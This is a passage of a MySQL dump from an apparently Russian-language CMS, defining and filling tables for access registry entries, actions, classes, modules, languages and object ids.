  (1830,10),
  (1831,10),
  (1832,54),
  (1833,11),
  (1834,10),
  (1835,10),
  (1836,10),
  (1837,10),
  (1838,54),
  (1839,11),
  (1840,10),
  (1841,10),
  (1842,10),
  (1843,10),
  (1844,54),
  (1845,11),
  (1846,54),
  (1847,11),
  (1848,54),
  (1849,11),
  (1850,54),
  (1851,11),
  (1852,54),
  (1853,11),
  (1854,10),
  (1855,10),
  (1856,10),
  (1858,11),
  (1859,10),
  (1861,11),
  (1862,10),
  (1863,10),
  (1864,10),
  (1865,10),
  (1866,10),
  (1867,10),
  (1868,54),
  (1869,11),
  (1870,10),
  (1871,54),
  (1872,11),
  (1873,10),
  (1874,54),
  (1875,11),
  (1876,54),
  (1877,11),
  (1878,10),
  (1880,11),
  (1882,11),
  (1884,11),
  (1885,10),
  (1886,10),
  (1887,54),
  (1888,11),
  (1889,54),
  (1890,11),
  (1892,11),
  (1893,10),
  (1894,10),
  (1895,10),
  (1896,54),
  (1897,11),
  (1898,54),
  (1899,11),
  (1900,10),
  (1901,10),
  (1902,10),
  (1903,10),
  (1904,10),
  (1905,10),
  (1906,10),
  (1907,10),
  (1908,10),
  (1909,10),
  (1910,10),
  (1911,10),
  (1912,10),
  (1913,54),
  (1914,11),
  (1916,11),
  (1917,10),
  (1919,11),
  (1921,11),
  (1923,11),
  (1924,10),
  (1925,10),
  (1926,10),
  (1927,10),
  (1928,10),
  (1929,10),
  (1930,54),
  (1931,11),
  (1932,54),
  (1933,11),
  (1934,10),
  (1935,10),
  (1936,54),
  (1937,11),
  (1938,10),
  (1939,10),
  (1940,10),
  (1941,54),
  (1942,11),
  (1943,10),
  (1944,10),
  (1945,10),
  (1946,10),
  (1947,10),
  (1948,10),
  (1949,10),
  (1950,10),
  (1951,54),
  (1952,11),
  (1953,10),
  (1954,10),
  (1955,54),
  (1956,11),
  (1957,10),
  (1958,10),
  (1959,54),
  (1960,11),
  (1961,10),
  (1962,10),
  (1963,10),
  (1964,10),
  (1965,54),
  (1966,11),
  (1967,10),
  (1968,54),
  (1969,11),
  (1970,10),
  (1971,10),
  (1972,10),
  (1973,10),
  (1976,54),
  (1977,11),
  (1978,10),
  (1979,10),
  (1980,10),
  (1981,10),
  (1982,10),
  (1983,54),
  (1984,11),
  (1985,10),
  (1986,54),
  (1987,11),
  (1988,10),
  (1989,10),
  (1990,54),
  (1991,11),
  (1992,54),
  (1993,11),
  (1995,11),
  (1996,54),
  (1997,11),
  (1998,10),
  (1999,10),
  (2000,10),
  (2001,10),
  (2002,54),
  (2003,11),
  (2004,10),
  (2005,10),
  (2006,10),
  (2007,10),
  (2008,10),
  (2009,10),
  (2010,10),
  (2011,10),
  (2012,10),
  (2013,10),
  (2014,10),
  (2015,10),
  (2016,10),
  (2017,54),
  (2018,11),
  (2019,10),
  (2020,10),
  (2021,10),
  (2022,10),
  (2023,10),
  (2024,54),
  (2025,11),
  (2026,10),
  (2027,10),
  (2028,10),
  (2029,10),
  (2030,10),
  (2031,10),
  (2032,10),
  (2033,54),
  (2034,11),
  (2035,54),
  (2036,11),
  (2037,54),
  (2038,11),
  (2039,54),
  (2040,11),
  (2041,10),
  (2042,10),
  (2043,10),
  (2044,10),
  (2045,10),
  (2046,54),
  (2047,11),
  (2048,10),
  (2049,54),
  (2050,11),
  (2051,10),
  (2052,10),
  (2053,54),
  (2054,11),
  (2055,54),
  (2056,11),
  (2057,10),
  (2058,10),
  (2059,10),
  (2060,54),
  (2061,11),
  (2062,10),
  (2063,10),
  (2064,10),
  (2065,10),
  (2066,10),
  (2067,10),
  (2068,10),
  (2069,10),
  (2070,10),
  (2071,10),
  (2072,10),
  (2073,10),
  (2074,10),
  (2075,10),
  (2076,10),
  (2077,10),
  (2078,10),
  (2079,10),
  (2080,10),
  (2081,10),
  (2082,10),
  (2083,10),
  (2084,10),
  (2085,54),
  (2086,11),
  (2087,10),
  (2088,54),
  (2089,11),
  (2090,54),
  (2091,11),
  (2092,10),
  (2093,10),
  (2094,10),
  (2095,10),
  (2096,10),
  (2097,10),
  (2098,10),
  (2099,10),
  (2100,10),
  (2101,10),
  (2102,10),
  (2103,10),
  (2104,10),
  (2105,10),
  (2106,10),
  (2108,10),
  (2114,10),
  (2115,10),
  (2116,10),
  (2117,54),
  (2118,11),
  (2119,54),
  (2120,11),
  (2121,54),
  (2122,11),
  (2123,10),
  (2124,10),
  (2125,10),
  (2126,10),
  (2127,10),
  (2128,10),
  (2129,10),
  (2130,10),
  (2131,10),
  (2132,10),
  (2133,54),
  (2134,11),
  (2135,10),
  (2136,10),
  (2137,54),
  (2138,11),
  (2139,10),
  (2140,54),
  (2141,11),
  (2142,10),
  (2143,54),
  (2144,11),
  (2145,54),
  (2146,11),
  (2147,54),
  (2148,11),
  (2149,10),
  (2150,54),
  (2151,11),
  (2152,10),
  (2153,10),
  (2154,10),
  (2155,54),
  (2156,11),
  (2157,10),
  (2158,10),
  (2159,54),
  (2160,11),
  (2161,10),
  (2162,10),
  (2163,10),
  (2164,10),
  (2165,10),
  (2166,10),
  (2167,10),
  (2168,10),
  (2169,10),
  (2170,10),
  (2171,54),
  (2172,11),
  (2174,11),
  (2176,10),
  (2177,10),
  (2178,10),
  (2179,54),
  (2180,11),
  (2181,54),
  (2182,11),
  (2183,10),
  (2184,10),
  (2185,10),
  (2186,10),
  (2187,10),
  (2188,54),
  (2189,11),
  (2190,10),
  (2191,54),
  (2192,11),
  (2193,10),
  (2194,10),
  (2195,10),
  (2196,10),
  (2197,10),
  (2198,10),
  (2199,10),
  (2200,10),
  (2201,54),
  (2202,11),
  (2203,10),
  (2204,10),
  (2205,54),
  (2206,11),
  (2207,10),
  (2208,10),
  (2209,10),
  (2210,10),
  (2211,10),
  (2212,10),
  (2213,10),
  (2214,10),
  (2215,10),
  (2216,10),
  (2217,10),
  (2218,54),
  (2219,11),
  (2220,54),
  (2221,11),
  (2222,54),
  (2223,11),
  (2224,10),
  (2225,10),
  (2226,10),
  (2227,54),
  (2228,11),
  (2229,10),
  (2230,10),
  (2231,10),
  (2232,10),
  (2233,10),
  (2234,54),
  (2235,11),
  (2236,54),
  (2237,11),
  (2238,10),
  (2239,54),
  (2240,11),
  (2241,10),
  (2242,54),
  (2243,11),
  (2244,54),
  (2245,11),
  (2246,10),
  (2247,10),
  (2248,10),
  (2249,54),
  (2250,11),
  (2251,10);
COMMIT;

#
# Data for the `sys_access_registry` table  (LIMIT 1500,500)
#

INSERT INTO `sys_access_registry` (`obj_id`, `class_id`) VALUES 
  (2252,54),
  (2253,11),
  (2254,10),
  (2255,10),
  (2256,10),
  (2257,10),
  (2258,10),
  (2259,10),
  (2260,54),
  (2261,11),
  (2262,54),
  (2263,11),
  (2264,10),
  (2265,10),
  (2266,10),
  (2267,10),
  (2268,10),
  (2269,10),
  (2270,10),
  (2271,10),
  (2272,10),
  (2273,10),
  (2274,10),
  (2275,10),
  (2276,54),
  (2277,11),
  (2278,10),
  (2279,54),
  (2280,11),
  (2281,54),
  (2282,11),
  (2283,10),
  (2284,10),
  (2285,10),
  (2286,10),
  (2287,54),
  (2288,11),
  (2289,10),
  (2290,10),
  (2291,10),
  (2292,10),
  (2293,54),
  (2294,11),
  (2295,10),
  (2296,54),
  (2297,11),
  (2298,54),
  (2299,11),
  (2300,10),
  (2301,10),
  (2302,10),
  (2303,54),
  (2304,11),
  (2305,54),
  (2306,11),
  (2307,10),
  (2308,10),
  (2309,10),
  (2310,10),
  (2311,10),
  (2312,10),
  (2313,10),
  (2314,10),
  (2315,10),
  (2316,10),
  (2317,10),
  (2318,10),
  (2319,10),
  (2320,10),
  (2321,54),
  (2322,11),
  (2323,54),
  (2324,11),
  (2325,10),
  (2326,10),
  (2327,10),
  (2328,10),
  (2329,10),
  (2330,54),
  (2331,11),
  (2332,10),
  (2333,10),
  (2334,10),
  (2335,10),
  (2336,10),
  (2337,10),
  (2338,10),
  (2339,54),
  (2340,11),
  (2341,10),
  (2342,10),
  (2343,10),
  (2349,10),
  (2350,10),
  (2351,10),
  (2352,10),
  (2353,10),
  (2354,10),
  (2355,10),
  (2356,11),
  (2357,10),
  (2358,10),
  (2359,10),
  (2360,10),
  (2361,10),
  (2362,10),
  (2363,10),
  (2364,10),
  (2365,10),
  (2366,10),
  (2367,10),
  (2368,11),
  (2369,11),
  (2370,11),
  (2371,11),
  (2372,10),
  (2373,11),
  (2374,10),
  (2375,10),
  (2376,10),
  (2377,10),
  (2378,10),
  (2379,10),
  (2380,10),
  (2381,10),
  (2382,10),
  (2383,10),
  (2384,10),
  (2385,10),
  (2386,10),
  (2387,10),
  (2388,10),
  (2389,10),
  (2390,10),
  (2391,10),
  (2392,10),
  (2393,10),
  (2394,10),
  (2395,10),
  (2396,10),
  (2397,10),
  (2398,10),
  (2399,10),
  (2400,10),
  (2401,10),
  (2402,10),
  (2403,10),
  (2404,10),
  (2405,10),
  (2406,10),
  (2407,10),
  (2408,10),
  (2409,10),
  (2410,10),
  (2411,10),
  (2412,10),
  (2413,10),
  (2414,10),
  (2415,10),
  (2416,10),
  (2417,10),
  (2418,10),
  (2419,10),
  (2420,10),
  (2421,10),
  (2422,10),
  (2423,10),
  (2424,10),
  (2425,10),
  (2426,10),
  (2427,10),
  (2428,10),
  (2429,10),
  (2430,10),
  (2431,10),
  (2432,10),
  (2433,10),
  (2434,10),
  (2435,10),
  (2436,10),
  (2437,10),
  (2438,10),
  (2439,10),
  (2440,10),
  (2441,10),
  (2442,10),
  (2443,10),
  (2444,10),
  (2445,10),
  (2446,10),
  (2447,10),
  (2448,10),
  (2449,10),
  (2450,10),
  (2451,10),
  (2452,10),
  (2453,10),
  (2454,10),
  (2455,10),
  (2456,10),
  (2457,10),
  (2458,10),
  (2459,11),
  (2460,11),
  (2461,10),
  (2462,11),
  (2463,11),
  (2464,11),
  (2465,11),
  (2466,11),
  (2467,10),
  (2468,10),
  (2469,10),
  (2470,10),
  (2471,10),
  (2472,10),
  (2473,10),
  (2474,10),
  (2475,10),
  (2476,10),
  (2477,11),
  (2478,11),
  (2479,11),
  (2480,11),
  (2481,11),
  (2482,11),
  (2483,11),
  (2484,11),
  (2485,11),
  (2486,9),
  (2487,7),
  (2488,7),
  (2489,7),
  (2490,7),
  (2491,7),
  (2492,7),
  (2493,7),
  (2494,7),
  (2495,7),
  (2496,7),
  (2497,7),
  (2498,1),
  (2499,6),
  (2500,7),
  (2501,7),
  (2502,17),
  (2503,7),
  (2504,7),
  (2505,52),
  (2506,11),
  (2507,10),
  (2508,10),
  (2509,10),
  (2510,53),
  (2511,53),
  (2512,53),
  (2513,53),
  (2514,53),
  (2515,53),
  (2516,53),
  (2517,53),
  (2518,53),
  (2519,53),
  (2520,11),
  (2521,11),
  (2522,53),
  (2523,53),
  (2524,53),
  (2525,53),
  (2526,53),
  (2527,53),
  (2528,53),
  (2529,53),
  (2530,53),
  (2531,53),
  (2532,11),
  (2533,53),
  (2534,53),
  (2535,53),
  (2536,53),
  (2537,53),
  (2538,53),
  (2539,53),
  (2540,53),
  (2541,53),
  (2542,53),
  (2543,53),
  (2544,53),
  (2545,53),
  (2546,53),
  (2547,53),
  (2548,53),
  (2549,53),
  (2550,53),
  (2551,53),
  (2552,53),
  (2553,53),
  (2554,53),
  (2555,53),
  (2556,53),
  (2557,53),
  (2558,53),
  (2559,53),
  (2560,53),
  (2561,53),
  (2562,53),
  (2563,11),
  (2564,11),
  (2565,10),
  (2566,10),
  (2567,10),
  (2568,53),
  (2569,53),
  (2570,53),
  (2571,53),
  (2572,53),
  (2573,53),
  (2574,53),
  (2575,53),
  (2576,53),
  (2577,53),
  (2578,53),
  (2579,53),
  (2580,53),
  (2581,53),
  (2582,53),
  (2583,53),
  (2584,53),
  (2585,53),
  (2586,53),
  (2587,53),
  (2588,53),
  (2589,53),
  (2590,53),
  (2591,53),
  (2592,53),
  (2593,53),
  (2594,53),
  (2595,53),
  (2596,53),
  (2597,53),
  (2598,53),
  (2599,53),
  (2600,53),
  (2601,53),
  (2602,53),
  (2603,53),
  (2604,53),
  (2605,53),
  (2606,53),
  (2607,53),
  (2608,53),
  (2609,53),
  (2610,53),
  (2612,11);
COMMIT;

#
# Structure for the `sys_actions` table : 
#

DROP TABLE IF EXISTS `sys_actions`;

CREATE TABLE `sys_actions` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
)ENGINE=MyISAM
AUTO_INCREMENT=112 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_actions` table  (LIMIT 0,500)
#

INSERT INTO `sys_actions` (`id`, `name`) VALUES 
  (1,'edit'),
  (2,'delete'),
  (3,'view'),
  (4,'create'),
  (5,'list'),
  (6,'createFolder'),
  (7,'editFolder'),
  (8,'deleteFolder'),
  (9,'editACL'),
  (10,'login'),
  (11,'exit'),
  (12,'memberOf'),
  (13,'groupDelete'),
  (14,'groupsList'),
  (15,'groupEdit'),
  (16,'membersList'),
  (17,'addToGroup'),
  (18,'editDefault'),
  (19,'post'),
  (20,'admin'),
  (21,'devToolbar'),
  (27,'upload'),
  (28,'get'),
  (29,'move'),
  (30,'moveFolder'),
  (51,'groupCreate'),
  (52,'viewGallery'),
  (53,'createAlbum'),
  (54,'editAlbum'),
  (55,'viewAlbum'),
  (56,'uploadPhoto'),
  (57,'viewThumbnail'),
  (59,'viewPhoto'),
  (60,'editPhoto'),
  (61,'save'),
  (62,'deletemenu'),
  (63,'addmenu'),
  (64,'editmenu'),
  (65,'additem'),
  (66,'last'),
  (67,'moveUp'),
  (68,'moveDown'),
  (69,'register'),
  (70,'results'),
  (71,'send'),
  (72,'addCategory'),
  (73,'deleteCategory'),
  (74,'editCategory'),
  (75,'viewActual'),
  (76,'deleteAlbum'),
  (77,'deletecat'),
  (78,'createcat'),
  (79,'editcat'),
  (80,'forum'),
  (81,'thread'),
  (82,'newThread'),
  (83,'createCategory'),
  (84,'createForum'),
  (85,'editForum'),
  (86,'goto'),
  (87,'editThread'),
  (88,'moveThread'),
  (89,'up'),
  (90,'down'),
  (91,'createRoot'),
  (92,'browse'),
  (93,'new'),
  (94,'editTags'),
  (95,'tagsCloud'),
  (96,'itemsTagsCloud'),
  (97,'searchByTag'),
  (98,'profile'),
  (99,'groupAdmin'),
  (100,'editProfile'),
  (101,'massAction'),
  (102,'translate'),
  (103,'configuration'),
  (104,'adminTypes'),
  (105,'adminProperties'),
  (106,'listAll'),
  (107,'add'),
  (108,'quote'),
  (109,'rss'),
  (110,'vote'),
  (111,'rate');
COMMIT;

#
# Structure for the `sys_classes` table : 
#

DROP TABLE IF EXISTS `sys_classes`;

CREATE TABLE `sys_classes` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `module_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
)ENGINE=MyISAM
AUTO_INCREMENT=60 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_classes` table  (LIMIT 0,500)
#

INSERT INTO `sys_classes` (`id`, `name`, `module_id`) VALUES 
  (1,'news',1),
  (2,'newsFolder',1),
  (3,'user',2),
  (4,'group',2),
  (6,'page',4),
  (7,'access',5),
  (8,'userGroup',2),
  (9,'admin',6),
  (10,'comments',8),
  (11,'commentsFolder',8),
  (12,'userAuth',2),
  (13,'pageFolder',4),
  (17,'file',9),
  (18,'folder',9),
  (19,'catalogue',10),
  (20,'catalogueFolder',10),
  (21,'gallery',11),
  (22,'album',11),
  (23,'photo',11),
  (24,'menuItem',12),
  (25,'menu',12),
  (26,'menuFolder',12),
  (27,'userOnline',2),
  (28,'question',13),
  (29,'answer',13),
  (30,'voteFolder',13),
  (32,'message',14),
  (33,'messageCategory',14),
  (34,'voteCategory',13),
  (35,'forum',15),
  (36,'category',15),
  (37,'thread',15),
  (38,'post',15),
  (39,'faq',16),
  (41,'faqCategory',16),
  (42,'faqFolder',16),
  (43,'categoryFolder',15),
  (44,'tags',17),
  (45,'tagsItem',17),
  (46,'tagsItemRel',17),
  (47,'captcha',18),
  (48,'profile',15),
  (49,'storage',9),
  (50,'userFolder',2),
  (52,'groupFolder',2),
  (53,'ratingsFolder',21),
  (54,'ratings',21),
  (55,'quote',22),
  (56,'quoteCategory',22),
  (57,'quoteFolder',22),
  (59,'commentsVote',8);
COMMIT;

#
# Structure for the `sys_classes_actions` table : 
#

DROP TABLE IF EXISTS `sys_classes_actions`;

CREATE TABLE `sys_classes_actions` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `class_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `action_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `class_id` (`class_id`, `action_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=309 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_classes_actions` table  (LIMIT 0,500)
#

INSERT INTO `sys_classes_actions` (`id`, `class_id`, `action_id`) VALUES 
  (1,1,1),
  (2,1,2),
  (3,1,3),
  (4,1,9),
  (5,2,4),
  (6,2,5),
  (7,2,6),
  (8,2,7),
  (9,2,8),
  (10,2,9),
  (11,3,10),
  (12,3,11),
  (13,3,5),
  (14,3,1),
  (15,3,12),
  (16,3,2),
  (17,4,13),
  (19,4,15),
  (20,4,16),
  (21,4,17),
  (22,3,9),
  (23,4,9),
  (24,6,3),
  (25,6,9),
  (28,6,1),
  (29,6,2),
  (31,7,18),
  (32,7,9),
  (34,9,3),
  (35,9,9),
  (36,10,1),
  (37,10,2),
  (38,10,9),
  (39,11,5),
  (40,11,19),
  (41,11,9),
  (46,13,9),
  (47,13,7),
  (48,13,6),
  (49,13,4),
  (50,13,5),
  (51,9,21),
  (62,18,27),
  (63,17,1),
  (64,17,28),
  (65,17,2),
  (66,17,9),
  (67,18,9),
  (68,17,18),
  (69,18,18),
  (70,1,29),
  (71,17,29),
  (72,18,6),
  (73,18,8),
  (74,18,7),
  (76,2,30),
  (77,18,30),
  (91,13,8),
  (92,13,30),
  (95,19,2),
  (99,20,5),
  (100,20,4),
  (102,20,6),
  (103,20,7),
  (104,20,30),
  (105,20,8),
  (107,19,29),
  (108,19,1),
  (111,19,9),
  (114,7,20),
  (115,20,9),
  (116,6,29),
  (129,19,3),
  (130,21,9),
  (131,22,9),
  (132,23,9),
  (133,21,52),
  (134,21,53),
  (135,22,54),
  (136,22,55),
  (137,22,56),
  (138,23,57),
  (139,23,2),
  (141,23,3),
  (143,23,59),
  (144,23,60),
  (145,24,9),
  (146,25,9),
  (147,25,3),
  (151,24,1),
  (152,24,4),
  (155,25,62),
  (156,24,2),
  (157,26,9),
  (158,26,20),
  (160,26,63),
  (161,25,64),
  (168,21,20),
  (169,28,9),
  (170,29,9),
  (171,30,9),
  (172,31,9),
  (174,28,3),
  (176,28,70),
  (177,28,1),
  (178,28,19),
  (179,32,9),
  (180,33,9),
  (181,33,5),
  (182,32,3),
  (185,33,71),
  (186,32,2),
  (187,30,20),
  (189,28,2),
  (190,34,9),
  (192,34,4),
  (194,30,72),
  (195,34,73),
  (196,34,74),
  (197,34,75),
  (198,22,76),
  (199,24,29),
  (200,35,9),
  (201,36,9),
  (202,37,9),
  (203,38,9),
  (205,39,9),
  (206,40,9),
  (207,41,9),
  (208,42,9),
  (209,41,5),
  (210,41,4),
  (211,39,1),
  (212,39,2),
  (214,41,77),
  (215,42,20),
  (216,42,78),
  (217,41,79),
  (218,43,9),
  (219,43,80),
  (221,37,81),
  (222,35,5),
  (223,35,82),
  (224,37,19),
  (225,38,1),
  (226,43,83),
  (227,35,20),
  (229,36,74),
  (230,36,84),
  (231,35,85),
  (232,37,66),
  (233,38,86),
  (234,37,87),
  (235,37,88),
  (239,25,91),
  (240,18,5),
  (241,18,92),
  (242,44,9),
  (243,45,9),
  (244,46,9),
  (249,45,96),
  (250,45,95),
  (251,45,94),
  (252,45,5),
  (253,1,97),
  (254,47,9),
  (255,47,3),
  (258,48,9),
  (259,48,98),
  (260,49,9),
  (261,36,73),
  (263,50,9),
  (264,50,20),
  (266,50,69),
  (270,50,4),
  (271,50,51),
  (272,51,9),
  (277,52,9),
  (279,52,51),
  (280,52,14),
  (281,48,100),
  (282,20,101),
  (284,53,9),
  (285,54,9),
  (288,19,104),
  (289,19,105),
  (290,55,9),
  (291,56,9),
  (292,57,9),
  (299,55,2),
  (300,55,1),
  (301,56,74),
  (302,57,72),
  (303,58,9),
  (304,59,9),
  (306,10,110);
COMMIT;

#
# Structure for the `sys_classes_sections` table : 
#

DROP TABLE IF EXISTS `sys_classes_sections`;

CREATE TABLE `sys_classes_sections` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `class_id` INTEGER(11) DEFAULT NULL,
  `section_id` INTEGER(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `module_section` (`section_id`, `class_id`),
  KEY `class_id` (`class_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=59 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_classes_sections` table  (LIMIT 0,500)
#

INSERT INTO `sys_classes_sections` (`id`, `class_id`, `section_id`) VALUES 
  (3,3,2),
  (4,4,2),
  (6,6,4),
  (7,7,6),
  (8,8,2),
  (9,9,7),
  (10,10,8),
  (11,11,8),
  (12,12,2),
  (13,13,4),
  (14,17,9),
  (15,18,9),
  (24,27,2),
  (28,31,13),
  (40,45,17),
  (41,44,17),
  (42,46,17),
  (43,47,18),
  (48,49,9),
  (49,50,2),
  (50,51,2),
  (51,52,2),
  (54,55,20),
  (55,56,20),
  (56,57,20),
  (57,58,8),
  (58,59,8);
COMMIT;

#
# Structure for the `sys_lang` table : 
#

DROP TABLE IF EXISTS `sys_lang`;

CREATE TABLE `sys_lang` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` CHAR(20) COLLATE utf8_general_ci DEFAULT NULL,
  `title` CHAR(20) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_lang` table  (LIMIT 0,500)
#

INSERT INTO `sys_lang` (`id`, `name`, `title`) VALUES 
  (1,'ru','ру'),
  (2,'en','en');
COMMIT;

#
# Structure for the `sys_lang_lang` table : 
#

DROP TABLE IF EXISTS `sys_lang_lang`;

CREATE TABLE `sys_lang_lang` (
  `id` INTEGER(11) UNSIGNED NOT NULL,
  `lang_id` INTEGER(11) UNSIGNED NOT NULL,
  `name` CHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`, `lang_id`)
)ENGINE=MyISAM
ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_lang_lang` table  (LIMIT 0,500)
#

INSERT INTO `sys_lang_lang` (`id`, `lang_id`, `name`) VALUES 
  (1,1,'русский'),
  (1,2,'russian'),
  (2,1,'английский'),
  (2,2,'english');
COMMIT;

#
# Structure for the `sys_modules` table : 
#

DROP TABLE IF EXISTS `sys_modules`;

CREATE TABLE `sys_modules` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `main_class` INTEGER(11) UNSIGNED DEFAULT NULL,
  `title` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `icon` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `order` INTEGER(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=23 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_modules` table  (LIMIT 0,500)
#

INSERT INTO `sys_modules` (`id`, `name`, `main_class`, `title`, `icon`, `order`) VALUES 
  (1,'news',1,'Новости','news.gif',10),
  (2,'user',50,'Пользователи','users.gif',90),
  (4,'page',6,'Страницы','pages.gif',20),
  (5,'access',7,'Права доступа','access.gif',10),
  (6,'admin',9,'Администрирование','admin.gif',20),
  (8,'comments',10,'Комментарии','comments.gif',40),
  (9,'fileManager',17,'Менеджер файлов','fm.gif',50),
  (10,'catalogue',19,'Каталог','catalogue.gif',30),
  (11,'gallery',21,'Галерея','gallery.gif',80),
  (12,'menu',26,'Меню','pages.gif',90),
  (13,'voting',30,'Голосование','voting.gif',0),
  (14,'message',32,'Сообщения пользователей','page.gif',0),
  (15,'forum',35,'Форум','forum.gif',0),
  (16,'faq',42,'FAQ','faq.gif',0),
  (17,'tags',45,'','',0),
  (18,'captcha',47,'Captcha','',0),
  (19,'pager',NULL,'Пейджер',NULL,NULL),
  (20,'simple',NULL,'simple',NULL,NULL),
  (21,'ratings',53,'Рейтинги','',0),
  (22,'quoter',57,'Цитатник','',0);
COMMIT;

#
# Structure for the `sys_obj_id` table : 
#

DROP TABLE IF EXISTS `sys_obj_id`;

CREATE TABLE `sys_obj_id` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=2613 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_obj_id` table  (LIMIT 0,500)
#

INSERT INTO `sys_obj_id` (`id`) VALUES 
  (1),
  (2),
  (3),
  (4),
  (5),
  (6),
  (7),
  (8),
  (9),
  (10),
  (11),
  (12),
  (13),
  (14),
  (15),
  (16),
  (17),
  (18),
  (19),
  (20),
  (21),
  (22),
  (23),
  (24),
  (25),
  (26),
  (27),
  (28),
  (29),
  (30),
  (31),
  (32),
  (33),
  (34),
  (35),
  (36),
  (37),
  (38),
  (39),
  (40),
  (41),
  (42),
  (43),
  (44),
  (45),
  (46),
  (47),
  (48),
  (49),
  (50),
  (51),
  (52),
  (53),
  (54),
  (55),
  (56),
  (57),
  (58),
  (59),
  (60),
  (61),
  (62),
  (63),
  (64),
  (65),
  (66),
  (67),
  (68),
  (69),
  (70),
  (71),
  (72),
  (73),
  (74),
  (75),
  (76),
  (77),
  (78),
  (79),
  (80),
  (81),
  (82),
  (83),
  (84),
  (85),
  (86),
  (87),
  (88),
  (89),
  (90),
  (91),
  (92),
  (93),
  (94),
  (95),
  (96),
  (97),
  (98),
  (99),
  (100),
  (101),
  (102),
  (103),
  (104),
  (105),
  (106),
  (107),
  (108),
  (109),
  (110),
  (111),
  (112),
  (113),
  (114),
  (115),
  (116),
  (117),
  (118),
  (119),
  (120),
  (121),
  (122),
  (123),
  (124),
  (125),
  (126),
  (127),
  (128),
  (129),
  (130),
  (131),
  (132),
  (133),
  (134),
  (135),
  (136),
  (137),
  (138),
  (139),
  (140),
  (141),
  (142),
  (143),
  (144),
  (145),
  (146),
  (147),
  (148),
  (149),
  (150),
  (151),
  (152),
  (153),
  (154),
  (155),
  (156),
  (157),
  (158),
  (159),
  (160),
  (161),
  (162),
  (163),
  (164),
  (165),
  (166),
  (167),
  (168),
  (169),
  (170),
  (171),
  (172),
  (173),
  (174),
  (175),
  (176),
  (177),
  (178),
  (179),
  (180),
  (181),
  (182),
  (183),
  (184),
  (185),
  (186),
  (187),
  (188),
  (189),
  (190),
  (191),
  (192),
  (193),
  (194),
  (195),
  (196),
  (197),
  (198),
  (199),
  (200),
  (201),
  (202),
  (203),
  (204),
  (205),
  (206),
  (207),
  (208),
  (209),
  (210),
  (211),
  (212),
  (213),
  (214),
  (215),
  (216),
  (217),
  (218),
  (219),
  (220),
  (221),
  (222),
  (223),
  (224),
  (225),
  (226),
  (227),
  (228),
  (229),
  (230),
  (231),
  (232),
  (233),
  (234),
  (235),
  (236),
  (237),
  (238),
  (239),
  (240),
  (241),
  (242),
  (243),
  (244),
  (245),
  (246),
  (247),
  (248),
  (249),
  (250),
  (251),
  (252),
  (253),
  (254),
  (255),
  (256),
  (257),
  (258),
  (259),
  (260),
  (261),
  (262),
  (263),
  (264),
  (265),
  (266),
  (267),
  (268),
  (269),
  (270),
  (271),
  (272),
  (273),
  (274),
  (275),
  (276),
  (277),
  (278),
  (279),
  (280),
  (281),
  (282),
  (283),
  (284),
  (285),
  (286),
  (287),
  (288),
  (289),
  (290),
  (291),
  (292),
  (293),
  (294),
  (295),
  (296),
  (297),
  (298),
  (299),
  (300),
  (301),
  (302),
  (303),
  (304),
  (305),
  (306),
  (307),
  (308),
  (309),
  (310),
  (311),
  (312),
  (313),
  (314),
  (315),
  (316),
  (317),
  (318),
  (319),
  (320),
  (321),
  (322),
  (323),
  (324),
  (325),
  (326),
  (327),
  (328),
  (329),
  (330),
  (331),
  (332),
  (333),
  (334),
  (335),
  (336),
  (337),
  (338),
  (339),
  (340),
  (341),
  (342),
  (343),
  (344),
  (345),
  (346),
  (347),
  (348),
  (349),
  (350),
  (351),
  (352),
  (353),
  (354),
  (355),
  (356),
  (357),
  (358),
  (359),
  (360),
  (361),
  (362),
  (363),
  (364),
  (365),
  (366),
  (367),
  (368),
  (369),
  (370),
  (371),
  (372),
  (373),
  (374),
  (375),
  (376),
  (377),
  (378),
  (379),
  (380),
  (381),
  (382),
  (383),
  (384),
  (385),
  (386),
  (387),
  (388),
  (389),
  (390),
  (391),
  (392),
  (393),
  (394),
  (395),
  (396),
  (397),
  (398),
  (399),
